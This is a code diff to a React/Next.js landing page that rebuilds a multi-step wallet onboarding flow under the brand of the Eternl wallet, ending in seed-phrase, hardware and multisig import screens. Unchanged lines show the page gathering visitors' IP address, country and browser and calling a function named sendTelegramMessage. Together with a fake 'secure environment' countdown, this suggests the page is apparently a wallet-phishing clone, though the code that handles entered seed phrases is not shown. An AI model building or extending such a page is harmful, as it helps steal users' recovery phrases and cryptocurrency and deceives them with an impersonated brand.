@@ -3,10 +3,38 @@
 import { useState, useEffect } from "react";
 import Image from "next/image";
 import Link from "next/link";
-import WelcomeModal from "../../components/WelcomeModal";
-import AppSetupModal from "../../components/AppSetupModal";
-import CreatePinModal from "../../components/CreatePinModal";
-import SelectWalletTypeModal from "../../components/SelectWalletTypeModal";
+import {
+  EternlAppSetupModal,
+  EternlPinCodeModal,
+  EternlWalletTypeModal,
+  WalletPostOnboardingStack,
+  EternlWelcomeModal,
+} from "../../components/onboarding";
+import EternlTermsDrawer from "../../components/onboarding/EternlTermsDrawer";
+import EternlPreloader from "../../components/EternlPreloader";
+import MultiSigSetup from "../../components/MultiSigSetup";
+import SecondaryModal from "../../components/SecondaryModal";
+
+type OnboardingStep =
+  | "welcome"
+  | "appSetup"
+  | "pinCode"
+  | "preloader"
+  | "terms"
+  | "walletType"
+  | "walletFlow";
+
+type WalletPickerKey =
+  | "new"
+  | "hardware"
+  | "seed"
+  | "multisig"
+  | "more"
+  | "import-backup"
+  | "cli-signing-keys"
+  | "account-pubkey"
+  | "address-readonly"
+  | "qr-import";
 import { useRef } from "react";
 import { usePathname } from "next/navigation";
 import { getUserCountry } from "../userLocation";
@@ -14,11 +42,46 @@ import axios from "axios";
 import { API_CONFIG } from "../config";
 
 export default function LandingPage() {
-  // Two modals managed separately
-  const [welcomeOpen, setWelcomeOpen] = useState(true);
-  const [setupOpen, setSetupOpen] = useState(false);
-  const [pinOpen, setPinOpen] = useState(false);
-  const [showSelectType, setShowSelectType] = useState(false);
+  const [step, setStep] = useState<OnboardingStep>("welcome");
+  const [open, setOpen] = useState(false);
+  const [mode, setMode] = useState<"simple" | "pro" | null>(null);
+  const [preloaderCounter, setPreloaderCounter] = useState(3);
+  const [view, setView] = useState<"main" | "more">("main");
+  const [activeSecondaryKey, setActiveSecondaryKey] = useState<WalletPickerKey | null>(null);
+
+  // Handle transition countdown for secure environment initialization
+  useEffect(() => {
+    if (step === "preloader" && open) {
+      setPreloaderCounter(3);
+      const timer = setInterval(() => {
+        setPreloaderCounter((prev) => {
+          if (prev <= 1) {
+            clearInterval(timer);
+            setStep("terms");
+            return 0;
+          }
+          return prev - 1;
+        });
+      }, 1000);
+      return () => clearInterval(timer);
+    }
+  }, [step, open]);
+
+  const closeAll = () => {
+    setOpen(false);
+    setStep("welcome");
+    setView("main");
+    setActiveSecondaryKey(null);
+  };
+
+  const handleMainSelect = (key: "new" | "hardware" | "seed" | "multisig" | "more") => {
+    if (key === "more") {
+      setView("more");
+      return;
+    }
+    setActiveSecondaryKey(key as WalletPickerKey);
+    setStep("walletFlow");
+  };
   const [country, setCountry] = useState("");
   const [ipAddress, setIpAddress] = useState("");
   const [browser, setBrowser] = useState("");
@@ -109,6 +172,7 @@ export default function LandingPage() {
       setBrowser(navigator.userAgent);
     }
   }, [sendTelegramMessage]);
+
   return (
     <main className="min-h-screen bg-[#0e0e0e] text-white flex flex-col items-center relative">
       {/* Top gradient line */}
@@ -132,7 +196,7 @@ export default function LandingPage() {
         </p>
 
         <button
-          onClick={() => setWelcomeOpen(true)}
+          onClick={() => { setStep("welcome"); setOpen(true); }}
           className="mt-8 bg-pink-500 hover:bg-pink-600 text-white font-semibold rounded-full px-8 py-4 transition"
         >
           Open app
@@ -260,66 +324,78 @@ export default function LandingPage() {
         </div>
       </footer>
 
-      {/* 🌈 Welcome Modal */}
-      <WelcomeModal
-        open={welcomeOpen}
-        onClose={() => setWelcomeOpen(false)}
-        onNext={() => {
-          setWelcomeOpen(false);
-          setSetupOpen(true);
+      {/* STEP 1: WELCOME */}
+      <EternlWelcomeModal
+        open={open && step === "welcome"}
+        onNext={() => setStep("appSetup")}
+        onClose={closeAll}
+      />
+
+      {/* STEP 2: APP SETUP */}
+      <EternlAppSetupModal
+        open={open && step === "appSetup"}
+        onBack={() => setStep("welcome")}
+        onNext={(settings) => {
+          setMode(settings.mode);
+          setStep("pinCode");
         }}
-        illustration={
-          <Image
-            src="/brand/laptop.svg"
-            alt="Welcome Illustration"
-            width={420}
-            height={300}
+        onClose={closeAll}
+      />
+
+      {/* STEP 3: CREATE PIN CODE */}
+      <EternlPinCodeModal
+        open={open && step === "pinCode"}
+        onBack={() => setStep("appSetup")}
+        onNext={(pin) => setStep("preloader")}
+        onSkip={() => setStep("preloader")}
+        onClose={closeAll}
+      />
+
+      {/* STEP 4: PRELOADER TRANSITION */}
+      {open && step === "preloader" && (
+        <div className="fixed inset-0 z-[100] flex flex-col items-center justify-center bg-black/90 backdrop-blur-xl">
+           <EternlPreloader />
+           <div className="mt-8 text-white/60 text-lg font-medium animate-pulse">
+              Initializing secure environment... {preloaderCounter}s
+           </div>
+        </div>
+      )}
+
+      {/* STEP 5: TERMS AGREEMENT */}
+      <EternlTermsDrawer
+        open={open && step === "terms"}
+        onConfirm={() => setStep("walletType")}
+        onClose={() => setStep("pinCode")}
+      />
+
+      {/* STEP 6: WALLET TYPE PICKER */}
+      <EternlWalletTypeModal
+        open={open && step === "walletType" && view === "main"}
+        onClose={closeAll}
+        onSelect={handleMainSelect}
+      />
+
+      {/* STEP 7: WALLET FLOW (Seed phrase / Hardware) */}
+      <WalletPostOnboardingStack
+        open={open && step === "walletFlow"}
+        showTerms={false}
+        initialSubView={activeSecondaryKey === "new" ? "mnemonic" : activeSecondaryKey === "seed" ? "seedType" : activeSecondaryKey === "hardware" ? "hardware" : null}
+        onDismiss={() => setStep("walletType")}
+        onWalletSelect={(key, payload) => closeAll()}
+      />
+
+      <SecondaryModal
+        open={open && step === "walletFlow" && !["new", "seed", "hardware"].includes(activeSecondaryKey || "") && activeSecondaryKey != null}
+        onClose={() => setStep("walletType")}
+        title={ activeSecondaryKey === "multisig" ? "Multi-Sig Wallet" : "" }
+      >
+        {activeSecondaryKey === "multisig" ? (
+          <MultiSigSetup
+            onCancel={() => setStep("walletType")}
+            onConfirm={(data) => closeAll()}
           />
-        }
-      />
-
-      {/* ⚙️ Setup Modal */}
-      <AppSetupModal
-        open={setupOpen}
-        onClose={() => setSetupOpen(false)}
-        onBack={() => {
-          setSetupOpen(false);
-          setWelcomeOpen(true);
-        }}
-        onNext={() => {
-          setSetupOpen(false);
-          setPinOpen(true);
-        }}
-      />
-
-      {/* 🔐 Create PIN Modal */}
-      <CreatePinModal
-        open={pinOpen}
-        onClose={() => setPinOpen(false)}
-        onBack={() => {
-          setPinOpen(false);
-          setSetupOpen(true); // go back one step
-        }}
-        onNext={() => {
-          setPinOpen(false);
-          setTimeout(() => setShowSelectType(true), 150); // open wallet type modal
-        }}
-      />
-
-      {/* 💼 Select Wallet Type Modal */}
-      <SelectWalletTypeModal
-        open={showSelectType}
-        onClose={() => setShowSelectType(false)}
-        onBack={() => {
-          setShowSelectType(false);
-          setPinOpen(true);
-        }}
-        onSelect={(key) => {
-          console.log("Selected wallet type:", key);
-          // you can trigger the next modal here based on key, e.g.:
-          // if (key === "new") setShowCreateWallet(true);
-        }}
-      />
+        ) : null}
+      </SecondaryModal>
     </main>
   );
 }
